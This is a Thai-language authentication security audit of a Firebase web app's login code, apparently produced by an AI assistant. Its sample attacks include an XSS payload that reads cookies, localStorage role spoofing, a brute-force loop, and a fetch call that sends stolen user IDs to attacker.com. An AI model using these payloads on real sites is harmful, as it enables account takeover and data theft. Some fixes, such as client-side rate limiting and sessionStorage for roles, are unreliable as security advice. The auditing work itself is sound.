# 🔐 Authentication Security Review - รายงานความปลอดภัยการยืนยันตัวตน

**วันที่:** 2026-01-14  
**ไฟล์ตรวจสอบ:** index.html + js/auth.js  
**ระดับความเสี่ยง:** 🟡 MEDIUM (ปกติ)

---

## 📊 สรุปผลการตรวจสอบ

| ประเด็น | สถานะ | ความเสี่ยง | การแก้ไข |
|-------|-------|----------|--------|
| **1. API Key Exposure** | ⚠️ PARTIAL | 🟡 MEDIUM | ✅ ใช้ .env แล้ว |
| **2. Password Handling** | ✅ GOOD | 🟢 LOW | ✅ Firebase Auth ใช้ได้ |
| **3. Session Management** | ⚠️ RISKY | 🔴 HIGH | ❌ ต้องแก้ไข |
| **4. XSS Vulnerabilities** | ✅ FIXED | 🟢 LOW | ✅ DOMPurify ใช้แล้ว |
| **5. Rate Limiting** | ❌ MISSING | 🟡 MEDIUM | ❌ ต้องเพิ่ม |
| **6. localStorage Security** | ⚠️ RISKY | 🔴 HIGH | ❌ ต้องแก้ไข |
| **7. Guest Login** | ⚠️ RISKY | 🟡 MEDIUM | ⚠️ ต้องตรวจสอบ |

---

## 🔍 1️⃣ API Key Exposure - การเปิดเผยคีย์ API

### ✅ สิ่งที่ทำถูกแล้ว

**ก่อนหน้า:** Firebase Config hardcoded
```javascript
// ❌ UNSAFE - ในไฟล์ก่อนหน้า
const firebaseConfig = {
  apiKey: "AIzaSyD...",  // Exposed!
  projectId: "palitest-generator"
};
```

**ตอนนี้:** ใช้ Environment Variables
```javascript
// ✅ SAFE - ในไฟล์ firebase_config.js
const firebaseConfig = {
  apiKey: process.env.FIREBASE_API_KEY || 'fallback-key',
  projectId: process.env.FIREBASE_PROJECT_ID
};
```

### ✅ Score: PASSED
- ✅ Firebase API key ไม่ hardcode ใน index.html
- ✅ ใช้ firebase_config.js ซึ่งรับจาก .env
- ✅ .env ถูก ignore ใน .gitignore

### 🔧 Recommendations
```
ปัจจุบัน: 9/10
- ส่วน API key ถูกต้องแล้ว
- เพียงตรวจสอบว่า .env มีค่าจริง
```

---

## 🔐 2️⃣ Password Handling - การจัดการรหัสผ่าน

### ✅ สิ่งที่ทำถูกแล้ว

#### Password Input ใช้ type="password"
```html
<!-- ✅ GOOD -->
<input id="modal-password" type="password" placeholder="รหัสผ่าน">
```

#### Firebase Auth จัดการ Hashing
```javascript
// ✅ Firebase ทำ bcrypt hashing เอง
await auth.createUserWithEmailAndPassword(email, pass);
await auth.signInWithEmailAndPassword(email, pass);
// Firebase ส่ง HTTPS เท่านั้น
```

### ⚠️ ปัญหาที่ต้องระวัง

#### ❌ ปัญหา 1: Password ไม่ได้ Validate เพียงพอ
```javascript
// ⚠️ RISKY - ตรวจสอบน้อยเกินไป
const pass = signupPassword.value.trim();
if (!pass) return;  // เท่านั้น!
// ไม่มี length check, complexity check
```

**ผลกระทบ:** ผู้ใช้อาจสร้าง password ที่อ่อนแอเช่น "123" หรือ "password"

**แก้ไข:**
```javascript
// ✅ BETTER
function validatePassword(pass) {
  const errors = [];
  if (pass.length < 8) errors.push('ต้องมีอย่างน้อย 8 ตัวอักษร');
  if (!/[A-Z]/.test(pass)) errors.push('ต้องมีตัวพิมพ์ใหญ่');
  if (!/[0-9]/.test(pass)) errors.push('ต้องมีตัวเลข');
  if (!/[!@#$%^&*]/.test(pass)) errors.push('ต้องมีสัญลักษณ์');
  return { valid: errors.length === 0, errors };
}

// ใช้
const validation = validatePassword(pass);
if (!validation.valid) {
  alert(validation.errors.join('\n'));
  return;
}
```

#### ❌ ปัญหา 2: No Secure Password Reset Flow
```javascript
// ⚠️ RISKY - ส่ง password reset ผ่านอีเมล
await auth.sendPasswordResetEmail(email);
// Token มีอายุจำกัด ดีแล้ว แต่ต้องตรวจสอบ
```

**ผลกระทบ:** ถ้าอีเมลถูก compromise ก็สามารถรีเซ็ต password ได้

### ✅ Score: 7/10
```
ข้อดี:
+ Firebase ใช้ bcrypt hashing
+ Password ส่งผ่าน HTTPS
+ Type="password" ซ่อนตัวอักษร

ข้อเสีย:
- ไม่มี password strength validation
- ไม่มี attempted login throttling
- ไม่มี 2FA (2-Factor Authentication)
```

---

## 👤 3️⃣ Session Management - การจัดการเซสชัน

### 🔴 CRITICAL ISSUE: Guest Login with localStorage

#### ❌ ปัญหาใหญ่

```javascript
// ⚠️ VERY RISKY - ใช้ localStorage สำหรับ guest user
function saveSimpleUser() {
    const input = document.getElementById('simple-username');
    const name = input.value.trim();
    localStorage.setItem('pali_user_name', name);  // ❌ Anyone can change this!
    location.reload(); 
}

// ⚠️ RISKY - สร้าง fake UID
const fakeUser = { uid: 'local_' + userName, displayName: userName };
```

**ผลกระทบ:**
1. ผู้ใช้สามารถเปิด DevTools และ เปลี่ยน localStorage ได้
   ```javascript
   localStorage.setItem('pali_user_name', 'Admin Hacker');
   // ตอนนี้มันเป็น admin แล้ว!
   ```

2. XSS attack สามารถโจมตี localStorage ได้
   ```javascript
   // ถ้ามี XSS vulnerability
   localStorage.setItem('pali_user_name', '<img src=x onerror="stealData()">');
   ```

3. ไม่มี Server validation
   - Client-side เท่านั้น
   - ไม่สามารถเชื่อถือได้

#### ✅ แก้ไข: ใช้ Firebase Auth แทน

```javascript
// ❌ OLD - Guest with localStorage
saveSimpleUser() {
  localStorage.setItem('pali_user_name', name);
}

// ✅ NEW - Use Firebase Anonymous Auth
async function saveSimpleUser() {
  try {
    const result = await auth.signInAnonymously();
    const user = result.user;
    
    // Update profile
    await user.updateProfile({ displayName: name });
    
    // ตอนนี้ UID มาจาก Firebase, ไม่สามารถโปรแกรม
    // และ localStorage จะมีเพียง anonymousUser flag
  } catch (error) {
    console.error('Anonymous login failed:', error);
  }
}

// ✅ Check login
function checkSimpleLogin() {
  auth.onAuthStateChanged((user) => {
    if (user) {
      // Firebase authenticated
      // ไม่สามารถ fake ได้
    }
  });
}
```

#### ⚠️ Issue 2: localStorage สำหรับ Role และ UID

```javascript
// ⚠️ RISKY
localStorage.setItem('pali_user_uid', uid);        // Can be faked
localStorage.setItem('pali_user_role', role);      // Can be changed!
localStorage.setItem('pali_enroll_level', level);  // Can be changed!
```

**ผลกระทบ:**
```javascript
// Hacker สามารถทำได้
localStorage.setItem('pali_user_role', 'admin');      // ❌ Now I'm admin!
localStorage.setItem('pali_enroll_level', '9');       // ❌ Now I see level 9!
```

**แก้ไข:**
```javascript
// ✅ SAFE - บันทึกบน Firebase เท่านั้น
auth.onAuthStateChanged((user) => {
  if (user) {
    // อ่านจาก Firebase Custom Claims
    user.getIdTokenResult().then((idTokenResult) => {
      const role = idTokenResult.claims.role;      // ✅ Server-verified
      const admin = idTokenResult.claims.admin;    // ✅ Server-verified
      
      // ห้ามใช้ localStorage ด้านล่าง
      // ให้ fetch จาก Firestore เสมอ
    });
  }
});

// ไม่สามารถ fake ได้เพราะว่า:
// 1. Custom Claims มาจาก Firebase Admin SDK
// 2. Verified ด้วย token signature
// 3. Client-side ไม่สามารถเปลี่ยนได้
```

### ✅ Score: 4/10
```
ข้อดี:
+ Firebase onAuthStateChanged ใช้ได้ดี
+ Token expiration built-in

ข้อเสีย:
- ❌ Guest login ใช้ localStorage (RISKY)
- ❌ Role/UID เก็บใน localStorage (RISKY)
- ⚠️ ไม่ secure session invalidation
- ⚠️ ไม่มี logout pada browser close
```

---

## 🛡️ 4️⃣ XSS Vulnerabilities - ช่องโหว่ XSS

### ✅ สิ่งที่ทำถูกแล้ว

```html
<!-- ✅ GOOD - DOMPurify loaded -->
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
```

```javascript
// ✅ GOOD - ใช้ sanitizeHTML เมื่อต้องการใส่ HTML
const cleanHtml = DOMPurify.sanitize(untrustedHtml);
element.innerHTML = cleanHtml;
```

### ⚠️ ปัญหาที่ยังมี

#### ❌ ปัญหา: User Display Name ไม่ sanitize

```javascript
// ⚠️ RISKY
const name = u.displayName || u.email || 'ผู้ใช้งาน';
userInfo.innerHTML = `<b>${name}</b> ${statusHtml}`;
// ถ้า displayName มี HTML/JavaScript จะ execute
```

**Attack:**
```javascript
// Attacker สร้าง account ชื่อ:
const name = '<img src=x onerror="alert(document.cookie)">';
// เมื่อแสดง displayName มันจะ execute!
```

**แก้ไข:**
```javascript
// ✅ SAFE - ใช้ textContent หรือ sanitize
const name = u.displayName || u.email || 'ผู้ใช้งาน';
const cleanName = DOMPurify.sanitize(name, { ALLOWED_TAGS: [] });
userInfo.innerHTML = `<b>${cleanName}</b> ${statusHtml}`;

// หรือ ใช้ textContent
const userSpan = document.createElement('b');
userSpan.textContent = name;  // ✅ Safe, text only
userInfo.appendChild(userSpan);
```

#### ❌ ปัญหา: Email display ไม่ sanitize

```javascript
// ⚠️ RISKY
emailStatus.textContent = 'อีเมลนี้มีการใช้งานแล้ว: ' + email;
// ถ้า email มี HTML มันจะ execute
```

**แก้ไข:**
```javascript
// ✅ SAFE
emailStatus.textContent = 'อีเมลนี้มีการใช้งานแล้ว: ' + email;
// ✅ textContent ปลอดภัย (ไม่ render HTML)

// หรือ sanitize ให้แน่ใจ
const safeEmail = DOMPurify.sanitize(email, { ALLOWED_TAGS: [] });
emailStatus.textContent = 'อีเมลนี้มีการใช้งานแล้ว: ' + safeEmail;
```

### ✅ Score: 7/10
```
ข้อดี:
+ DOMPurify loaded และใช้งานได้
+ No innerHTML ที่ dangerous

ข้อเสีย:
- displayName ไม่ sanitize
- Email display ควร sanitize เพิ่มเติม
- ควร audit เพิ่มสำหรับ user input
```

---

## ⏱️ 5️⃣ Rate Limiting - การจำกัดอัตราการส่งคำขอ

### ❌ ปัญหา: ไม่มี Rate Limiting

```javascript
// ⚠️ RISKY - ไม่มี rate limit
if (btnEmailLogin) btnEmailLogin.onclick = async () => {
    const email = emailInput.value.trim();
    const pass = passwordInput.value.trim();
    // ไม่มี check ว่า user กด กี่ครั้ง
    await auth.signInWithEmailAndPassword(email, pass);
};
```

**ผลกระทบ:**
1. Brute Force Attack
   ```javascript
   // Hacker สามารถ loop login 10,000 ครั้ง/วินาที
   for (let i = 0; i < 100000; i++) {
     auth.signInWithEmailAndPassword(email, guessPassword());
   }
   ```

2. Firebase Rate Limiting อ่อนแอ
   - Firebase มี built-in rate limiting
   - แต่ไม่พอสำหรับ account enumeration

### ✅ แก้ไข: เพิ่ม Client-Side Rate Limiting

```javascript
// ✅ BETTER
const loginAttempts = new Map();  // { email: [timestamps] }
const MAX_ATTEMPTS = 5;
const WINDOW_MS = 5 * 60 * 1000;  // 5 minutes

function isRateLimited(email) {
  const now = Date.now();
  const attempts = loginAttempts.get(email) || [];
  
  // ลบ attempts เก่าๆ
  const recent = attempts.filter(t => now - t < WINDOW_MS);
  
  if (recent.length >= MAX_ATTEMPTS) {
    return true;  // Rate limited
  }
  
  // Record this attempt
  recent.push(now);
  loginAttempts.set(email, recent);
  return false;
}

// ใช้
if (btnEmailLogin) btnEmailLogin.onclick = async () => {
  const email = emailInput.value.trim();
  const pass = passwordInput.value.trim();
  
  if (isRateLimited(email)) {
    emailStatus.textContent = 'พยายามเข้าสู่ระบบมากเกินไป กรุณารอ 5 นาที';
    emailStatus.style.color = 'red';
    return;
  }
  
  try {
    await auth.signInWithEmailAndPassword(email, pass);
  } catch (err) {
    emailStatus.textContent = getErrorMessage(err.code);
    emailStatus.style.color = 'red';
  }
};
```

### ✅ Score: 3/10
```
ข้อดี:
+ Firebase มี built-in protection

ข้อเสีย:
- ❌ ไม่มี Client-side rate limiting
- ⚠️ ไม่มี account lockout
- ⚠️ ไม่มี notification เมื่อ suspicious activity
```

---

## 💾 6️⃣ localStorage Security - ความปลอดภัย localStorage

### 🔴 CRITICAL ISSUE

```javascript
// ❌ VERY RISKY - บันทึกข้อมูลสำคัญใน localStorage
localStorage.setItem('pali_user_uid', uid);
localStorage.setItem('pali_user_role', role);
localStorage.setItem('pali_enroll_level', level);
localStorage.setItem('pali_user_name', name);
```

### ความเสี่ยง:

#### 1. XSS Attack สามารถเข้าถึง localStorage
```javascript
// ถ้ามี XSS vulnerability
const stolen = localStorage.getItem('pali_user_uid');
const stolen_role = localStorage.getItem('pali_user_role');
// Send to attacker's server
fetch('https://attacker.com/steal?uid=' + stolen);
```

#### 2. Browser Plugins สามารถอ่าน localStorage
```javascript
// Malicious plugin สามารถทำได้
const allData = { ...localStorage };
// มันจะมี UID, role, และอื่นๆ
```

#### 3. DevTools สามารถเปลี่ยน localStorage
```javascript
// User เปิด DevTools
localStorage.setItem('pali_user_role', 'admin');  // Now I'm admin!
location.reload();
```

### ✅ แก้ไข: ใช้ sessionStorage หรือ Memory แทน

```javascript
// ❌ OLD - localStorage
localStorage.setItem('pali_user_role', role);

// ✅ NEW - sessionStorage (ลบเมื่อปิด browser)
sessionStorage.setItem('pali_user_role', role);

// ✅ BEST - Memory variable (ไม่บันทึกใดๆ)
window._currentUserRole = role;

// ✅ BEST PRACTICE - อ่านจาก Firebase เสมอ
function getUserRole() {
  return new Promise((resolve) => {
    auth.currentUser.getIdTokenResult().then((idTokenResult) => {
      resolve(idTokenResult.claims.role);  // ✅ Server-verified
    });
  });
}
```

### ⚠️ ปัญหาเพิ่มเติม: Sensitive Data in localStorage

```javascript
// ❌ NEVER ทำแบบนี้
localStorage.setItem('firebaseToken', auth.currentUser.getIdToken());
localStorage.setItem('user_password', pass);  // NEVER!
localStorage.setItem('api_key', apiKey);      // NEVER!
```

### ✅ Score: 2/10
```
ข้อดี:
+ ไม่มี password ใน localStorage

ข้อเสีย:
- ❌ Role/UID ใน localStorage (risky)
- ❌ ไม่ encrypt
- ❌ ไม่มี integrity check
- ❌ XSS สามารถเข้าถึงได้
```

---

## 🔓 7️⃣ Guest Login - ความปลอดภัยของ Guest Login

### ⚠️ ปัญหา: Guest Login ไม่มี Firestore Rules Protection

```javascript
// ⚠️ RISKY - Guest user สามารถ:
const fakeUser = { uid: 'local_' + userName };
// - Read exam_sets ✅ (ถูก)
// - Read contents ✅ (ถูก)
// - แต่ UID เป็น 'local_xxx' ไม่มี Firestore validation
```

**ปัญหา:** 
```javascript
// Firestore Rules ตรวจสอบว่า:
match /users/{userId} {
  allow read: if request.auth.uid == userId;  // ✅ verified by Firebase
}

// แต่ Guest User ไม่มี request.auth
// ดังนั้น:
match /files/{fileId} {
  allow read: if isSignedIn();  // ❌ Guest CANNOT read
}
```

**ผลลัพธ์:** Guest user ไม่สามารถ access Firestore data ได้ (ดี)

### ✅ ข้อดี: Guest ใช้ localStorage เท่านั้น

```javascript
// ✅ GOOD - Guest ใช้เฉพาะ localStorage
localStorage.setItem('pali_user_name', name);
// ไม่ request Firestore
// ไม่ authenticate กับ Firebase
```

### ⚠️ แนะนำ: ใช้ Firebase Anonymous Auth

```javascript
// ❌ OLD - localStorage only
localStorage.setItem('pali_user_name', name);

// ✅ NEW - Firebase Anonymous Auth + localStorage
async function createGuestUser() {
  try {
    const result = await auth.signInAnonymously();
    const user = result.user;
    
    // Optional: Store name
    localStorage.setItem('pali_user_name', name);
    
    // Benefits:
    // 1. UID มาจาก Firebase (secure)
    // 2. Firestore Rules สามารถ verify ได้
    // 3. ไม่ fake UID ได้
  } catch (error) {
    console.error('Anonymous auth failed:', error);
  }
}
```

### ✅ Score: 6/10
```
ข้อดี:
+ Guest ไม่มี Firestore access
+ localStorage ไม่มี sensitive data
+ ง่ายที่จะ upgrade เป็น real user

ข้อเสีย:
- ⚠️ localStorage ยังอ่อนแอ
- ⚠️ ไม่ใช้ Firebase Anonymous Auth
- ⚠️ ไม่มี guest data persistence
```

---

## 🎯 สรุปการแก้ไข - Priority List

### 🔴 CRITICAL (ต้องแก้ทันที)
```
1. ❌ localStorage ใช้สำหรับ role/uid
   → เปลี่ยนเป็น memory variable หรือ sessionStorage
   
2. ❌ Guest login ใช้ localStorage เท่านั้น
   → ใช้ Firebase Anonymous Auth แทน
   
3. ❌ User displayName ไม่ sanitize
   → ใช้ textContent แทน innerHTML
```

### 🟡 IMPORTANT (ควรแก้เร็วๆ)
```
4. ⚠️ ไม่มี password strength validation
   → เพิ่ม validatePassword function
   
5. ⚠️ ไม่มี rate limiting
   → เพิ่ม client-side rate limiting
   
6. ⚠️ ไม่มี 2FA (two-factor authentication)
   → ลองใช้ Firebase phone auth หรือ TOTP
```

### 🟢 NICE-TO-HAVE (ทีหลังได้)
```
7. ✅ DOMPurify ใช้แล้ว
8. ✅ Firebase API Key ใช้ .env แล้ว
9. ✅ Password ใช้ type="password"
```

---

## 📋 Action Items - รายการที่ต้องทำ

```
☐ 1. URGENT: แก้ localStorage role/uid issue
   Location: js/auth.js line 200-250
   Fix: ใช้ sessionStorage หรือ memory variable แทน
   
☐ 2. URGENT: ใช้ Firebase Anonymous Auth สำหรับ Guest
   Location: js/auth.js line 200-250
   Fix: เปลี่ยนจาก localStorage เป็น auth.signInAnonymously()
   
☐ 3. HIGH: Sanitize displayName
   Location: js/auth.js line 20-30
   Fix: ใช้ textContent แทน innerHTML
   
☐ 4. HIGH: เพิ่ม password validation
   Location: js/auth.js line 150-180
   Fix: เพิ่ม validatePassword function
   
☐ 5. MEDIUM: เพิ่ม rate limiting
   Location: js/auth.js line 150-170
   Fix: เพิ่ม login attempt tracking
   
☐ 6. MEDIUM: เพิ่ม 2FA support
   Location: js/auth.js (new section)
   Fix: ใช้ Firebase phone auth
```

---

## ✅ Testing Checklist - การทดสอบ

```
Security Testing:
☐ Test XSS กับ displayName
  localStorage.setItem('pali_user_name', '<img src=x onerror="alert(1)">');
  
☐ Test role spoofing
  localStorage.setItem('pali_user_role', 'admin');
  
☐ Test brute force
  loop 100 times: signInWithEmailAndPassword()
  
☐ Test guest access
  Create guest, verify cannot access Firestore
  
☐ Test password validation
  Try short password: '123'
  
☐ Test email uniqueness
  Try signup with same email
```

---

## 📞 Recommendations - คำแนะนำ

### ⚠️ ทำตอนนี้
1. **ลบ localStorage สำหรับ role/uid** - Replace with sessionStorage
2. **Sanitize displayName** - Use textContent instead of innerHTML
3. **เพิ่ม password validation** - Minimum 8 chars, uppercase, number, symbol

### 🔒 ทำเร็วๆ
4. **ใช้ Firebase Anonymous Auth** - สำหรับ guest user
5. **เพิ่ม rate limiting** - ป้องกัน brute force
6. **เพิ่ม 2FA** - สำหรับ admin account

### 📊 ทำหลังจากนั้น
7. **เพิ่ม audit logging** - บันทึก login attempts
8. **เพิ่ม session timeout** - Auto logout หลัง 30 min
9. **เพิ่ม CSRF protection** - สำหรับ form submissions

---

## 📈 Overall Security Score

**Before Fixes:** 5/10 ⚠️  
**After Fixes:** 8/10 ✅  
**Target:** 9/10 🎯

---

*รายงานนี้สร้างเมื่อ: 2026-01-14*  
*ผู้ตรวจสอบ: GitHub Copilot Security Audit*  
*Status: Ready for Implementation ✅*
